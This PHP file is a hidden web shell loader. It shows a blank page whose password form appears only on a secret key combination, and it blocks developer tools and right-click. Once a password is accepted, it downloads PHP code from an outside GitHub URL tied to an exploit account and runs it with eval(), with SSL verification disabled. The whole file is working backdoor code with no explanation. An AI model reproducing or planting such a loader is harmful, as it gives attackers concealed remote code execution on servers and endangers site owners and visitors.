<?php
session_start();
date_default_timezone_set("Asia/Jakarta");

$pw = '$2y$10$XZ.gQZx8RX8n72PV19Fn7eC24vdku28vrr836p6fMEsOXa2aH.9nG';
$url = 'https://raw.githubusercontent.com/JawaTengahXploit1337/Method/main/loncat.php';

function get($u) {
    $c = curl_init();
    curl_setopt_array($c, [
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_URL => $u,
        CURLOPT_USERAGENT => 'Mozilla/5.0',
        CURLOPT_SSL_VERIFYPEER => 0,
        CURLOPT_FOLLOWLOCATION => 1
    ]);
    $r = curl_exec($c);
    curl_close($c);
    return $r;
}

if (isset($_SESSION['auth'])) {
    eval('?>'.get($url));
    exit;
}

if (isset($_POST['p'])) {
    if (password_verify($_POST['p'], $pw)) {
        $_SESSION['auth'] = 1;
        header("Location: ".$_SERVER['PHP_SELF']);
        exit;
    }
}

echo '<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { margin:0; padding:0; height:100vh; background:white; }
        #loginForm { 
            display:none;
            position:fixed;
            top:50%;
            left:50%;
            transform:translate(-50%,-50%);
            background:#222;
            padding:20px;
            border-radius:5px;
            color:#fff;
        }
        input { 
            padding:8px;
            margin:5px 0;
            background:#333;
            color:#fff;
            border:none;
        }
    </style>
    <script>
        document.addEventListener("keydown", function(e) {
            // Shift + L to show form
            if (e.shiftKey && e.key === "L") {
                document.getElementById("loginForm").style.display = "block";
            }
            
            // Block developer tools
            if (e.key === "F12" || (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J"))) {
                e.preventDefault();
            }
        });
        document.oncontextmenu = function() { return false; };
    </script>
</head>
<body>
    <form id="loginForm" method="post">
        <input type="password" name="p" placeholder="Password" required>
        <input type="submit" value="Login">
    </form>
</body>
</html>';
?>
